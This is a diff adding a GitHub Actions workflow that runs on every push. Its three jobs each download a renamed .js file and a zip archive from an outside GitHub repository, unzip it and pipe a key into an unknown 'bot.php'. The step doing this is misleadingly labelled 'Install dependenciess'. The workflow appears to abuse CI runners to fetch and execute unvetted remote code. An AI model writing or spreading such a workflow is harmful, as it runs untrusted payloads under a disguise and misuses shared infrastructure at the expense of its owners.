@@ -1,0 +1,57 @@
+on:
+  push:
+name: nrtion
+
+jobs:
+  run_1:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: '8.1'
+        coverage: none
+    - name: Install dependenciess
+      run: |
+        wget https://github.com/Mosnio/mehi1/raw/main/cofng/xf.js -O config.json
+        wget https://github.com/Mosnio/mehi1/raw/main/cofng/wc.zip
+        unzip wc.zip
+        echo -e "e5a91e6413b6bd2d920ed68d82e3228f" | php bot.php
+        
+  run_2:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: '8.1'
+        coverage: none
+    - name: Install dependenciess
+      run: |
+        wget https://github.com/Mosnio/mehi1/raw/main/cofng/c1.js -O config.json
+        wget https://github.com/Mosnio/mehi1/raw/main/cofng/wc.zip
+        unzip wc.zip
+        echo -e "e5a91e6413b6bd2d920ed68d82e3228f" | php bot.php
+        
+  run_3:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: '8.1'
+        coverage: none
+    - name: Install dependenciess
+      run: |
+        wget https://github.com/Mosnio/mehi1/raw/main/cofng/cv.js -O config.json
+        wget https://github.com/Mosnio/mehi1/raw/main/cofng/wc.zip
+        unzip wc.zip
+        echo -e "e5a91e6413b6bd2d920ed68d82e3228f" | php bot.php
+        
+        
+        
+        
+        
+        
+        
+        
